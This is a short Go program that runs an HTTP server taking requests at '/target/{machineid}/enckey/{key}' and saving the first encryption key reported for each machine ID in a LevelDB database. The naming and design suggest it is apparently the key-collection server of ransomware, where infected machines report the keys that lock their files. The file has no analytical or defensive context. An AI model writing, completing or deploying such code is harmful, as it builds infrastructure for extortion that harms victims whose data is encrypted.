package main

import (
    "log"
    "net/http"
    "github.com/gorilla/mux"
    "github.com/syndtr/goleveldb/leveldb"
)

const (
    db_filepath = ""
)

func main() {
    db, err := leveldb.OpenFile(db_filepath, nil)
    if err != nil {
        log.Fatalln(err)
    }
    defer db.Close()

    r := mux.NewRouter()
    r.HandleFunc("/target/{machineid}/enckey/{key}", func(w http.ResponseWriter, r *http.Request) {
        params := mux.Vars(r)
        machineid := params["machineid"]
        key := params["key"]
        if _, err := db.Get([]byte(machineid), nil); err != nil {
            db.Put([]byte(machineid), []byte(key), nil)
        } else {
            return
        }
    }).Methods("GET")

    http.ListenAndServe(":8081", r)
}
